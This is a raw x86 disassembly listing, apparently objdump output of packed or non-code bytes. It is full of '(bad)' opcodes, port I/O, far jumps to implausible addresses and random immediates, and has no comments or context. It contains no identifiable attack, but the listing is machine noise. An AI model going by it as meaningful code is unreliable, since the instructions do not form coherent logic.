  41d9bd:	(bad)  
  41d9be:	dec    eax
  41d9bf:	adc    DWORD PTR [eax+0x7b],ebp
  41d9c2:	mov    ebp,0x711e74c4
  41d9c7:	sub    eax,0xc2081de1
  41d9cc:	xor    al,0x55
  41d9ce:	fidiv  DWORD PTR [esi]
  41d9d0:	xchg   esi,eax
  41d9d1:	icebp  
  41d9d2:	(bad)  
  41d9d3:	idiv   BYTE PTR [eax]
  41d9d5:	or     bh,BYTE PTR [ecx-0x24]
  41d9d8:	dec    ecx
  41d9d9:	add    BYTE PTR ds:0xcd2f3ae1,ch
  41d9df:	cmp    eax,0x473e008e
  41d9e4:	(bad)  
  41d9e5:	pop    eax
  41d9e6:	out    dx,al
  41d9e7:	inc    edx
  41d9e8:	mov    dh,0x78
  41d9ea:	push   esp
  41d9eb:	push   0x1cf0fcd
  41d9f0:	icebp  
  41d9f1:	mov    esp,DWORD PTR [ecx+0x6dafce7e]
  41d9f7:	ins    DWORD PTR es:[edi],dx
  41d9f8:	retf   0xf938
  41d9fb:	inc    edx
  41d9fc:	fimul  WORD PTR [eax+edx*1-0x39]
  41da00:	adc    BYTE PTR [esi-0x5f98f511],dl
  41da06:	push   0x3e43096d
  41da0b:	out    dx,eax
  41da0c:	pop    ecx
  41da0d:	cmp    ecx,DWORD PTR [ecx+0x3b]
  41da10:	xor    ecx,DWORD PTR [ecx-0x6]
  41da13:	xor    DWORD PTR [ebp+0x29],edi
  41da16:	jmp    0x80154477
  41da1b:	icebp  
  41da1c:	cld    
  41da1d:	lea    esi,[ebp-0x69cf0224]
  41da23:	mov    eax,0x31ab3f85
  41da28:	cld    
  41da29:	inc    eax
  41da2a:	lods   eax,DWORD PTR ds:[esi]
  41da2b:	shl    BYTE PTR [edx-0x42],1
  41da2e:	inc    edx
  41da2f:	imul   edi,DWORD PTR [edi-0x31],0xfffffffd
  41da33:	cmp    DWORD PTR [edi+esi*2+0x2e3ab8f],eax
  41da3a:	ja     0x41da41
  41da3c:	hlt    
  41da3d:	push   ebx
  41da3e:	add    esi,DWORD PTR [edx]
  41da40:	(bad)  
  41da42:	ret    
  41da43:	inc    ebp
  41da44:	dec    eax
  41da45:	(bad)  
  41da46:	icebp  
  41da47:	dec    ebp
  41da48:	mov    bh,0x59
  41da4a:	loope  0x41da9b
  41da4c:	pop    edx
  41da4d:	inc    esp
  41da4e:	jns    0x41da86
  41da50:	stos   DWORD PTR es:[edi],eax
  41da51:	add    eax,0xfc708e27
  41da56:	xchg   ebp,eax
  41da57:	or     BYTE PTR [eax],bh
  41da59:	lock dec edx
  41da5b:	cmp    al,0x4c
  41da5d:	xor    eax,0xd739c036
  41da62:	xchg   esp,eax
  41da63:	sub    ecx,DWORD PTR ds:0xeb481aa7
  41da69:	adc    DWORD PTR [eax-0x26ec1d8b],eax
  41da6f:	mov    edi,0x1f06ba
  41da74:	and    esp,DWORD PTR [edx-0x65]
  41da77:	sub    edx,DWORD PTR [eax+0x6a]
  41da7a:	bound  eax,QWORD PTR [esi+0xc4c59d7]
  41da80:	cmc    
  41da81:	scas   al,BYTE PTR es:[edi]
  41da82:	jge    0x41da0a
  41da84:	dec    esi
  41da85:	scas   al,BYTE PTR es:[edi]
  41da86:	es push 0x54
  41da89:	ror    BYTE PTR [ebx],cl
  41da8b:	xchg   eax,ebx
  41da8d:	mov    al,ds:0xbf09b1e9
  41da92:	mov    edi,0xa560c3eb
  41da97:	aas    
  41da98:	jmp    0x41db0f
  41da9a:	xchg   BYTE PTR [edi],dl
  41da9c:	sub    bh,dl
  41da9e:	mov    edx,0x583b59e4
  41daa3:	inc    esi
  41daa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daa5:	cdq    
  41daa6:	shl    DWORD PTR [esi-0x77],cl
  41daa9:	mov    al,ds:0x7abf78e5
  41daae:	pop    eax
  41daaf:	cmp    eax,0x51474f1c
  41dab4:	mov    esi,0x732e5583
  41dab9:	int    0x88
  41dabb:	cmc    
  41dabc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dabd:	in     al,dx
  41dabe:	sub    eax,0xdc4da261
  41dac3:	dec    esi
  41dac4:	(bad)  
  41dac5:	mov    cl,0x9d
  41dac7:	push   ss
  41dac8:	int3   
  41dac9:	in     eax,dx
  41daca:	push   edx
  41dacb:	xor    BYTE PTR [eax-0x6a],dh
  41dace:	mov    dh,0xc4
  41dad0:	fwait
  41dad1:	adc    edi,esp
  41dad3:	mov    WORD PTR [ebp-0x76],ds
  41dad6:	das    
  41dad7:	popf   
  41dad8:	cs mov ah,0x17
  41dadb:	dec    ebp
  41dadc:	jae    0x41daee
  41dade:	sbb    eax,0xc1f5b760
  41dae3:	mov    dl,0xba
  41dae5:	push   edi
  41dae6:	mov    esi,0xfb598871
  41daeb:	repz mov dh,0xc
  41daee:	mov    ebp,0x214dfa82
  41daf3:	leave  
  41daf4:	test   al,0x4
  41daf6:	cmp    eax,0xdd1c8ed9
  41dafb:	aam    0x51
  41dafd:	push   esp
  41dafe:	icebp  
  41daff:	out    dx,al
  41db00:	ds loopne 0x41da9e
  41db03:	dec    eax
  41db04:	into   
  41db05:	xor    ebx,DWORD PTR [ecx]
  41db07:	int3   
  41db08:	jge    0x41db51
  41db0a:	push   0x4e
  41db0c:	popf   
  41db0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db0e:	xor    dh,dl
  41db10:	sbb    ebp,edx
  41db12:	(bad)  
  41db13:	sbb    bh,BYTE PTR [eax]
  41db15:	inc    edx
  41db16:	dec    eax
  41db17:	dec    ebx
  41db18:	pop    ds
  41db19:	xor    DWORD PTR [eax+eiz*8+0x6e943f26],ecx
  41db20:	int    0x2a
  41db22:	std    
  41db23:	in     al,0x22
  41db25:	outs   dx,BYTE PTR ds:[esi]
  41db26:	fbld   TBYTE PTR [ebx+eiz*2]
  41db29:	adc    bl,BYTE PTR [edx]
  41db2b:	and    bl,BYTE PTR [edx-0x69acba6c]
  41db31:	xchg   edi,eax
  41db32:	mov    al,dl
  41db34:	jno    0x41db38
  41db36:	sub    DWORD PTR [ebx-0x65],0x65
  41db3a:	cmp    cl,BYTE PTR [edi+0x34414784]
  41db40:	shl    BYTE PTR [edx+0x66],cl
  41db43:	add    DWORD PTR [ebp+0x0],esp
  41db46:	sub    BYTE PTR ds:0x8aabaa4b,0x77
  41db4d:	mov    dl,0xa9
  41db4f:	les    edi,FWORD PTR [edi+0x38]
  41db52:	adc    al,0x66
  41db54:	repnz enter 0x2e8,0x5f
  41db59:	push   ecx
  41db5a:	jae    0x41dafe
  41db5c:	push   esi
  41db5d:	pusha  
  41db5e:	and    BYTE PTR [ecx-0xb17d3a5],0xe7
  41db65:	mov    bh,0xb1
  41db67:	pop    edx
  41db68:	pop    ebx
  41db69:	inc    edx
  41db6a:	cmc    
  41db6b:	pushf  
  41db6c:	sbb    al,0x36
  41db6e:	inc    ebp
  41db6f:	sahf   
  41db70:	mov    ch,0x21
  41db72:	or     al,0xc4
  41db74:	sub    edx,DWORD PTR [esi]
  41db76:	dec    DWORD PTR [esi+0x420bd866]
  41db7c:	inc    edi
  41db7d:	aad    0xdf
  41db7f:	shr    dl,cl
  41db81:	jb     0x41dba7
  41db83:	push   esp
  41db84:	shl    BYTE PTR [esi+0x145d2cf2],cl
  41db8a:	cmp    al,0x16
  41db8c:	test   BYTE PTR [eax+eiz*4],0x9
  41db90:	leave  
  41db91:	int    0x78
  41db93:	push   edx
  41db94:	mov    ch,0x16
  41db96:	jne    0x41dbc6
  41db98:	(bad)  
  41db99:	adc    eax,0xf9e53fab
  41db9e:	fbld   TBYTE PTR [ecx+edi*4-0x1816e76b]
  41dba5:	mov    ds:0x585310ab,al
  41dbaa:	(bad)  
  41dbab:	inc    esp
  41dbac:	es inc ebp
  41dbae:	dec    ebx
  41dbaf:	cli    
  41dbb0:	dec    edi
  41dbb1:	jg     0x41dc2e
  41dbb3:	mov    esi,0xd2a5e26e
  41dbb8:	jbe    0x41dbc6
  41dbba:	jae    0x41dbd0
  41dbbc:	lods   al,BYTE PTR ds:[esi]
  41dbbd:	int    0x94
  41dbbf:	mov    ebx,0x1e136d6b
  41dbc4:	adc    edx,DWORD PTR [edx+0x701a879]
  41dbca:	sti    
  41dbcb:	mov    edi,DWORD PTR [esi-0x47]
  41dbce:	mov    al,0xe8
  41dbd0:	sar    BYTE PTR [edx-0x69],0xf9
  41dbd4:	dec    esi
  41dbd5:	rep ins BYTE PTR es:[edi],dx
  41dbd7:	mov    al,ds:0x99f6af58
  41dbdc:	ja     0x41dc3e
  41dbde:	int3   
  41dbdf:	nop
  41dbe0:	mov    cl,0x5a
  41dbe2:	fistp  DWORD PTR ds:0x90452903
  41dbe8:	hlt    
  41dbe9:	dec    ebx
  41dbea:	and    eax,0x7490e147
  41dbef:	sub    BYTE PTR [edi],ah
  41dbf1:	nop
  41dbf2:	fwait
  41dbf3:	mov    cl,0xa6
  41dbf5:	or     cl,BYTE PTR [edx-0x68]
  41dbf8:	sbb    BYTE PTR [ecx-0x7a986ca6],al
  41dbfe:	mov    bl,0xe1
  41dc00:	loopne 0x41dc7f
  41dc02:	mov    dl,0x7f
  41dc04:	mov    db6,eax
  41dc07:	sar    DWORD PTR ds:0x8410981b,cl
  41dc0d:	scas   eax,DWORD PTR es:[edi]
  41dc0e:	pop    edi
  41dc0f:	test   DWORD PTR [ecx-0x72859481],ebp
  41dc15:	mov    al,ds:0x3602158d
  41dc1a:	pop    ebp
  41dc1b:	mov    dl,0xed
  41dc1d:	pop    edi
  41dc1e:	scas   eax,DWORD PTR es:[edi]
  41dc1f:	sbb    esi,DWORD PTR [esi-0x11]
  41dc22:	dec    esi
  41dc23:	cmp    BYTE PTR ds:0xe4ee6a86,0x9f
  41dc2a:	ja     0x41dc18
  41dc2c:	aam    0x1d
  41dc2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc2f:	ins    DWORD PTR es:[edi],dx
  41dc30:	shl    BYTE PTR [edx-0x4],0xb2
  41dc34:	and    al,0xc6
  41dc36:	xor    DWORD PTR [edx+ebp*8-0x45edcf07],0x6d1e33e3
  41dc41:	lods   al,BYTE PTR ds:[esi]
  41dc42:	(bad)
  41dc45:	loop   0x41dc41
  41dc47:	outs   dx,DWORD PTR ds:[esi]
  41dc48:	mov    ds:0x3e24f1f,al
  41dc4d:	data16 outs dx,BYTE PTR ds:[esi]
  41dc4f:	cdq    
  41dc50:	cmp    bh,BYTE PTR [ebp-0x55]
  41dc53:	inc    edi
  41dc54:	data16 das 
  41dc56:	xchg   ecx,eax
  41dc57:	mov    ds:0x664ec13c,al
  41dc5c:	push   DWORD PTR [edi+0x107d810e]
  41dc62:	fld    QWORD PTR [edi+0x21]
  41dc65:	fstp   DWORD PTR [ebp+edi*1+0x2a]
  41dc69:	out    dx,eax
  41dc6a:	or     al,0x3
  41dc6c:	cli    
  41dc6d:	xchg   ebp,eax
  41dc6e:	add    eax,0x68148902
  41dc73:	imul   ebx,DWORD PTR [ecx],0xffffff92
  41dc76:	aaa    
  41dc77:	rcr    al,0xa2
  41dc7a:	es ja  0x41dc0e
  41dc7d:	xchg   edx,eax
  41dc7e:	test   eax,0xd9f1b830
  41dc83:	and    eax,0x7b3dc5ae
  41dc88:	pop    ecx
  41dc89:	add    dl,BYTE PTR [ebp-0xb]
  41dc8c:	jae    0x41dcaf
  41dc8e:	xor    DWORD PTR [esi],edx
  41dc90:	sbb    DWORD PTR [ebx-0x39],esi
  41dc93:	popf   
  41dc94:	clc    
  41dc95:	(bad)  
  41dc96:	or     eax,0x9a54063f
  41dc9b:	out    0xa3,al
  41dc9d:	pop    edi
  41dc9e:	je     0x41dc95
  41dca0:	hlt    
  41dca1:	add    edi,DWORD PTR [eax+edi*4]
  41dca4:	imul   DWORD PTR [ebx-0x20bb8aff]
  41dcaa:	xchg   esi,eax
  41dcab:	cs leave 
  41dcad:	es jae 0x41dc8e
  41dcb0:	gs data16 mov ch,0x7e
  41dcb4:	sbb    eax,0x39716898
  41dcb9:	cdq    
  41dcba:	jbe    0x41dcd6
  41dcbc:	inc    esp
  41dcbd:	arpl   WORD PTR [ebx+0x2c08d1d0],bx
  41dcc3:	jmp    0x2d2facb
  41dcc8:	dec    ebx
  41dcc9:	(bad)  
  41dcca:	cmp    bl,dl
  41dccc:	lds    eax,FWORD PTR [esi+0x24]
  41dccf:	jb     0x41dcc6
  41dcd1:	(bad)  
  41dcd2:	lock pop es
  41dcd4:	imul   ebp,DWORD PTR [edx-0x320db510],0x92dc9da
  41dcde:	sub    eax,0xf02f21c8
  41dce3:	leave  
  41dce4:	mov    al,0xdb
  41dce6:	loope  0x41dcc1
  41dce8:	dec    edi
  41dce9:	mov    eax,fs
  41dceb:	and    al,0x51
  41dced:	std    
  41dcee:	pop    ebp
  41dcef:	(bad)  
  41dcf0:	ja     0x41dccf
  41dcf2:	xchg   ecx,eax
  41dcf3:	(bad)  
  41dcf4:	(bad)  
  41dcf5:	push   ecx
  41dcf6:	jle    0x41dc80
  41dcf8:	and    eax,0x978f5205
  41dcfd:	xchg   ebx,eax
  41dcfe:	sti    
  41dcff:	sub    al,0xca
  41dd01:	xchg   edx,eax
  41dd02:	sub    BYTE PTR [eax+0x1c],0x51
  41dd06:	cdq    
  41dd07:	adc    al,0xaf
  41dd09:	push   esp
  41dd0a:	(bad)  [edi*2-0x19d7fa31]
  41dd11:	mov    ?,WORD PTR [ebx-0x77]
  41dd14:	(bad)  
  41dd15:	cmp    dh,BYTE PTR [edi-0x74]
  41dd18:	rol    DWORD PTR [bx-0x1f4d],cl
  41dd1d:	jle    0x41dcc5
  41dd1f:	cwde   
  41dd20:	mov    edx,0x864072fb
  41dd25:	addr16 xor ebp,eax
  41dd28:	fadd   DWORD PTR [ecx]
  41dd2a:	xchg   ebp,eax
  41dd2b:	pop    esp
  41dd2c:	in     al,dx
  41dd2d:	ja     0x41dcdf
  41dd2f:	jbe    0x41dd95
  41dd31:	dec    ecx
  41dd32:	or     eax,0x8650b21a
  41dd37:	fisub  WORD PTR [ecx]
  41dd39:	je     0x41dd8c
  41dd3b:	std    
  41dd3c:	les    ecx,FWORD PTR ds:0x690622eb
  41dd42:	test   DWORD PTR [eax],0x7af2280
  41dd48:	sbb    edx,ebx
  41dd4a:	xchg   esp,eax
  41dd4b:	mov    BYTE PTR [edx],dl
  41dd4d:	push   ss
  41dd4e:	mov    ds:0xa7042c2c,al
  41dd53:	push   eax
  41dd54:	mov    dh,0x3
  41dd56:	or     al,0xa5
  41dd58:	pop    ecx
  41dd59:	pop    ecx
  41dd5a:	aas    
  41dd5b:	and    esp,edi
  41dd5d:	stos   DWORD PTR es:[edi],eax
  41dd5e:	ror    BYTE PTR [ebx-0x71],1
  41dd61:	les    ebp,FWORD PTR [edi+0x26caa978]
  41dd67:	push   ss
  41dd68:	fisub  WORD PTR [esi+0x462b6ad1]
  41dd6e:	ss mov edx,0xd0317a4a
  41dd74:	leave  
  41dd75:	xor    DWORD PTR [ebx+0x8e1a9b4],edi
  41dd7b:	or     BYTE PTR [ebx+0x4502ceda],ch
  41dd81:	pop    ecx
  41dd82:	out    0x5d,eax
  41dd84:	xor    bh,BYTE PTR [esi+0x61]
  41dd87:	and    ah,BYTE PTR [edx]
  41dd89:	imul   eax,DWORD PTR [eax+0x51573180],0xffffffc0
  41dd90:	lea    ebp,[eax+eiz*8-0x1b4c60ee]
  41dd97:	jmp    0xa1493b8d
  41dd9c:	leave  
  41dd9d:	ja     0x41de0b
  41dd9f:	fsub   DWORD PTR [edx-0x64]
  41dda2:	xor    DWORD PTR [ecx],edi
  41dda4:	(bad)  
  41dda5:	ins    DWORD PTR es:[edi],dx
  41dda6:	ins    BYTE PTR es:[edi],dx
  41dda7:	add    ecx,DWORD PTR [ebx-0x5c]
  41ddaa:	xor    al,0x18
  41ddac:	lds    ebx,FWORD PTR [edi+0x76]
  41ddaf:	ffree  st(0)
  41ddb1:	js     0x41de2e
  41ddb3:	jle    0x41de13
  41ddb5:	call   0x92cce8a1
  41ddba:	mov    bh,0xcc
  41ddbc:	loope  0x41dd82
  41ddbe:	cmp    al,BYTE PTR [eax]
  41ddc0:	and    eax,0x9d64c6a2
  41ddc5:	sbb    bh,BYTE PTR [ebp+ebx*1-0x69f54ba3]
  41ddcc:	lods   eax,DWORD PTR ds:[esi]
  41ddcd:	add    al,0x80
  41ddcf:	or     al,0x12
  41ddd1:	sbb    esp,esi
  41ddd3:	and    dh,dl
  41ddd5:	mov    dl,0x23
  41ddd7:	xchg   edx,eax
  41ddd8:	mov    esp,0x9c655e4b
  41dddd:	je     0x41ddba
  41dddf:	jmp    0x939b34ae
  41dde4:	scas   al,BYTE PTR es:[edi]
  41dde5:	pop    ds
  41dde6:	jns    0x41de1a
  41dde8:	pop    esi
  41dde9:	into   
  41ddea:	push   ds
  41ddeb:	mov    ah,BYTE PTR [ebx]
  41dded:	pop    esp
  41ddee:	clc    
  41ddef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddf0:	sub    BYTE PTR [edi+edi*2],al
  41ddf3:	mov    bh,0xcf
  41ddf5:	adc    edx,0xc4b5a2fc
  41ddfb:	sub    al,0x70
  41ddfd:	jns    0x41ddcf
  41ddff:	ja     0x41de6b
  41de01:	int3   
  41de02:	outs   dx,DWORD PTR ds:[esi]
  41de03:	dec    ebx
  41de04:	pop    ecx
  41de05:	sub    DWORD PTR [edx+0x6cedae6],ebx
  41de0b:	sub    DWORD PTR [ecx],ebp
  41de0d:	dec    ebp
  41de0e:	pop    es
  41de0f:	ja     0x41dd93
  41de11:	cmp    al,0x59
  41de13:	aad    0x5d
  41de15:	idiv   ebx
  41de17:	jg     0x41dddd
  41de19:	pop    esp
  41de1a:	xchg   ecx,eax
  41de1b:	cmp    eax,ecx
  41de1d:	rcl    cl,0x89
  41de20:	les    edi,FWORD PTR [ecx+0x424af02b]
  41de26:	sub    DWORD PTR [ecx],eax
  41de28:	mov    esp,0xf867b64c
  41de2d:	sub    ebp,ebx
  41de2f:	pop    esi
  41de30:	sbb    dl,al
  41de32:	cli    
  41de33:	mov    eax,ds:0x9853cb84
  41de38:	leave  
  41de39:	jge    0x41dddc
  41de3b:	jle    0x41de4b
  41de3d:	pop    esp
  41de3e:	cld    
  41de3f:	call   0xb8b3db47
  41de44:	sbb    dl,BYTE PTR [eax]
  41de46:	mov    bh,0x19
  41de48:	lahf   
  41de49:	jmp    0xa66dedf5
  41de4e:	sub    ch,ch
  41de50:	(bad)  
  41de52:	ret    
  41de53:	mov    BYTE PTR [ebp-0x42],al
  41de56:	push   0x2
  41de58:	add    BYTE PTR [edx+0x4ed9d03a],cl
  41de5e:	in     eax,dx
  41de5f:	mov    bl,0xd7
  41de61:	clc    
  41de62:	jae    0x41de61
  41de64:	loope  0x41dee0
  41de66:	shl    ecx,cl
  41de68:	or     dh,BYTE PTR [eax+0x35]
  41de6b:	add    ecx,eax
  41de6d:	mov    edx,0x8331d85b
  41de72:	daa    
  41de73:	in     al,0x26
  41de75:	adc    esp,ecx
  41de77:	sbb    eax,ecx
  41de79:	clc    
  41de7a:	addr16 inc ebp
  41de7c:	aad    0xcd
  41de7e:	mov    ah,BYTE PTR gs:0x2b8f8528
  41de85:	lock pop ebx
  41de87:	cdq    
  41de88:	mov    WORD PTR [ecx+0xc],?
  41de8b:	dec    ebp
  41de8c:	test   edx,ebx
  41de8e:	(bad)  
  41de8f:	rcl    DWORD PTR [ecx],0xbd
  41de92:	push   ss
  41de93:	call   0xdb45951a
  41de98:	mov    eax,ds:0x7e5fddf1
  41de9d:	imul   ebp,DWORD PTR [ebx],0xffffff90
  41dea0:	out    dx,eax
  41dea1:	add    ebx,DWORD PTR [esi+ebx*8-0x5e]
  41dea5:	lock mov esp,0xd478d744
  41deab:	outs   dx,BYTE PTR ds:[esi]
  41deac:	mov    fs,WORD PTR [edx+0x13]
  41deaf:	mov    DWORD PTR [esp+edi*4],edx
  41deb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb3:	and    DWORD PTR [ecx+esi*4+0x679f38bb],ecx
  41deba:	dec    ebp
  41debb:	lock inc edx
  41debd:	pusha  
  41debe:	loop   0x41dec1
  41dec0:	fadd   st(2),st
  41dec2:	cld    
  41dec3:	(bad)  
  41dec4:	div    BYTE PTR [ecx]
  41dec6:	pop    edi
  41dec7:	jnp    0x41deba
  41dec9:	add    BYTE PTR [edx],dh
  41decb:	pusha  
  41decc:	clc    
  41decd:	push   ecx
  41dece:	ror    ah,1
  41ded0:	mov    ds:0xd84b37a4,eax
  41ded5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ded6:	and    al,0xe5
  41ded8:	jmp    0xd3d7:0xfc193933
  41dedf:	xor    eax,0x250e0a1f
  41dee4:	xchg   esi,eax
  41dee5:	xor    ebx,ebx
  41dee7:	adc    DWORD PTR [ecx-0x29],ebx
  41deea:	xchg   ebp,eax
  41deeb:	into   
  41deec:	dec    ebp
  41deed:	daa    
  41deee:	cld    
  41deef:	ja     0x41df16
  41def1:	or     DWORD PTR [edx],ebx
  41def3:	dec    esp
  41def4:	pop    edi
  41def5:	rcr    BYTE PTR [ebx],0xc9
  41def8:	into   
  41def9:	mov    ebp,0x3edf5d12
  41defe:	jae    0x41deca
  41df00:	mov    ds:0x3169c8ec,eax
  41df05:	push   edi
  41df06:	jl     0x41deb2
  41df08:	jmp    0xec8f:0xdf47d49f
  41df0f:	push   esi
  41df10:	mov    DWORD PTR [ecx+ebp*2+0x751b8c48],ebx
  41df17:	adc    eax,0xa54b2845
  41df1c:	xchg   ebx,eax
  41df1d:	inc    ebp
  41df1e:	lods   eax,DWORD PTR ds:[esi]
  41df1f:	loopne 0x41deb3
  41df21:	aas    
  41df22:	and    dh,cl
  41df24:	in     al,0xf6
  41df26:	(bad)  
  41df27:	xchg   esi,eax
  41df28:	mov    edi,0x9656105
  41df2d:	jmp    0x69940e03
  41df32:	inc    edx
  41df33:	pop    es
  41df34:	mul    DWORD PTR [edi+0x2d]
  41df37:	mov    ebp,0x7336c151
  41df3c:	or     eax,0x20421eb4
  41df41:	add    edx,DWORD PTR [ebx]
  41df43:	jle    0x41def6
  41df45:	das    
  41df46:	xchg   DWORD PTR [esp+eiz*2+0xf],ebx
  41df4a:	add    ch,al
  41df4c:	inc    esp
  41df4d:	or     bl,BYTE PTR [ebx-0x69]
  41df50:	push   ss
  41df51:	sbb    ebp,DWORD PTR [esi]
  41df53:	mov    dl,0xc6
  41df55:	nop
  41df56:	mov    ebp,0xdd4bb0ca
  41df5b:	or     edi,edx
  41df5d:	imul   esp,DWORD PTR [edi-0x1c],0xd115fe70
  41df64:	jg     0x41df96
  41df66:	pop    ebx
  41df67:	dec    DWORD PTR [ebx]
  41df69:	das    
  41df6a:	and    eax,ecx
  41df6c:	imul   esp,edx,0x0
  41df6f:	and    ebp,DWORD PTR [eax-0x4b120b35]
  41df75:	xor    edi,ebp
  41df77:	or     ah,BYTE PTR [ebp-0x10ec2520]
  41df7d:	add    al,0xfa
  41df7f:	push   ebx
  41df80:	or     eax,0x8dee99bd
  41df85:	pop    ebx
  41df86:	mov    cl,0xe1
  41df88:	jbe    0x41dfdd
  41df8a:	jmp    0x1b72ddf4
  41df8f:	adc    BYTE PTR [ecx+0x7a],ch
  41df92:	and    eax,0x94bb5aa7
  41df97:	push   esp
  41df98:	pop    edx
  41df99:	fsubr  DWORD PTR [edx-0x14]
  41df9c:	(bad)  
  41df9e:	mov    dl,0x23
  41dfa0:	mov    edx,DWORD PTR [edi+ecx*8+0x58fba670]
  41dfa7:	retf   0x84b8
  41dfaa:	mov    ch,0x49
  41dfac:	xor    ah,0xc4
  41dfaf:	inc    ebx
  41dfb0:	mov    ecx,DWORD PTR [ebx+eax*1-0xf]
  41dfb4:	sbb    DWORD PTR [ebx],esi
  41dfb6:	inc    edx
  41dfb7:	jo     0x41df82
  41dfb9:	fnstsw WORD PTR [ecx]
  41dfbb:	dec    eax
  41dfbc:	or     ah,BYTE PTR ds:0xabccfae6
  41dfc2:	add    esp,DWORD PTR [edi-0x6f]
  41dfc5:	xchg   DWORD PTR [eax],edx
  41dfc7:	je     0x41df81
  41dfc9:	mov    ds:0xa52af95f,al
  41dfce:	les    esi,FWORD PTR [esi]
  41dfd0:	push   esi
  41dfd1:	mov    ebx,0x397c7480
  41dfd6:	push   ebp
  41dfd7:	test   al,0x6a
  41dfd9:	xchg   ecx,eax
  41dfda:	sub    edx,DWORD PTR [ecx+0x273abcf2]
  41dfe0:	shl    esp,1
  41dfe2:	iret   
  41dfe3:	call   0x18f0c0b9
  41dfe8:	lds    esp,FWORD PTR ds:0xbcac9344
  41dfee:	fcmovne st,st(2)
  41dff0:	aad    0x4b
  41dff2:	sub    BYTE PTR [edx-0x7a],0x1b
  41dff6:	aad    0x2e
  41dff8:	jmp    0xd9c824fc
  41dffd:	ss jp  0x41df80
  41e000:	arpl   WORD PTR [eax+0x4a11235a],di
  41e006:	ror    DWORD PTR [ecx-0x56ce2d35],1
  41e00c:	dec    ecx
  41e00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e00f:	rol    edi,0xc8
  41e012:	cmp    BYTE PTR [edi-0x626d8af4],ch
  41e018:	cmc    
  41e019:	mov    bh,0x7a
  41e01b:	and    al,0x0
  41e01d:	ds aam 0x6b
  41e020:	and    eax,0x53e16ed5
  41e025:	(bad)  
  41e026:	idiv   BYTE PTR [eax+0x38848e50]
  41e02c:	dec    ebp
  41e02d:	les    esp,FWORD PTR [ebx+0x61]
  41e030:	or     BYTE PTR [edx-0x53],bl
  41e033:	scas   al,BYTE PTR es:[edi]
  41e034:	in     eax,0x13
  41e036:	enter  0x618f,0xb9
  41e03a:	out    dx,eax
  41e03b:	(bad)  
  41e03c:	out    dx,eax
  41e03d:	test   eax,0x1afae7f8
  41e042:	icebp  
  41e043:	out    dx,eax
  41e044:	das    
  41e045:	mov    cl,0x82
  41e047:	push   ds
  41e048:	jae    0x41dfcb
  41e04a:	das    
  41e04b:	neg    ecx
  41e04d:	nop
  41e04e:	pop    ecx
  41e04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e050:	or     dh,BYTE PTR [ecx+edx*8+0x35]
  41e054:	gs ja  0x41e055
  41e057:	arpl   WORD PTR [esi],cx
  41e059:	dec    esp
  41e05a:	xor    al,0xa2
  41e05c:	xchg   cl,cl
  41e05e:	mov    al,0x8a
  41e060:	jmp    0x41e022
  41e062:	sbb    bl,BYTE PTR [ebp+0x3b]
  41e065:	retf   0x27e2
  41e068:	cli    
  41e069:	cwde   
  41e06a:	jae    0x41e0a2
  41e06c:	mov    edx,0xc1abcb77
  41e071:	enter  0x5a9c,0x56
  41e075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e076:	out    dx,eax
  41e077:	retf   0x9216
  41e07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e07b:	les    edi,FWORD PTR ds:[ebp+edi*8-0x1778879c]
  41e083:	lock lock xchg ebp,eax
  41e086:	lds    ebx,FWORD PTR [ecx-0x6756d916]
  41e08c:	mov    ds:0x1667ced,eax
  41e091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e092:	mov    ecx,edi
  41e094:	mov    ebx,0xc1c6fc95
  41e099:	mov    edi,DWORD PTR [ebx]
  41e09b:	add    al,BYTE PTR [ebx]
  41e09d:	fs loop 0x41e0a0
  41e0a0:	add    BYTE PTR [ebx+0x42],dh
  41e0a3:	(bad)  
  41e0a4:	push   0xffffff84
  41e0a6:	arpl   WORD PTR [ebx+esi*1-0x46],sp
  41e0aa:	fwait
  41e0ab:	lods   eax,DWORD PTR ds:[esi]
  41e0ac:	cmp    al,0xd4
  41e0ae:	in     eax,dx
  41e0af:	dec    esi
  41e0b0:	mov    al,ds:0x1c65b613
  41e0b5:	stc    
  41e0b6:	xchg   BYTE PTR [edi+0x64],cl
  41e0b9:	fistp  DWORD PTR [edx+0x71]
  41e0bc:	mov    eax,0xe553e2d0
  41e0c1:	(bad)  
  41e0c2:	adc    DWORD PTR [ebp+0x20748825],ecx
  41e0c8:	inc    edx
  41e0c9:	out    0xf4,eax
  41e0cb:	loope  0x41e0b8
  41e0cd:	shl    DWORD PTR [edx+0x7b82f084],0x31
  41e0d4:	jns    0x41e067
  41e0d6:	sub    al,0x10
  41e0d8:	or     ebp,ebx
  41e0da:	mov    dl,0xef
  41e0dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0dd:	pop    esp
  41e0de:	dec    esp
  41e0df:	sub    eax,0xaf210db8
  41e0e4:	push   ds
  41e0e5:	ds ret 
  41e0e7:	jg     0x41e09e
  41e0e9:	call   0xe37ff147
  41e0ee:	shr    BYTE PTR [ecx+0x4111c89d],1
  41e0f4:	and    esi,DWORD PTR [edx-0x50]
  41e0f7:	dec    esi
  41e0f8:	ret    
  41e0f9:	ror    BYTE PTR ds:0xb9953d87,1
  41e0ff:	or     DWORD PTR [edi+0x62],ebp
  41e102:	xchg   edi,eax
  41e103:	jb     0x41e117
  41e105:	mov    eax,0x843b9964
  41e10a:	jmp    0x98b4:0x7df3a4fc
  41e111:	out    0xe8,eax
  41e113:	mov    esi,DWORD PTR [ebp-0x6a]
  41e116:	stos   BYTE PTR es:[edi],al
  41e117:	into   
  41e118:	jmp    0x41e13c
  41e11a:	sub    eax,0xadfe2eaf
  41e11f:	add    eax,0xf1200b1
  41e124:	xor    esp,DWORD PTR [edi+ebx*2]
  41e127:	mov    al,0xa6
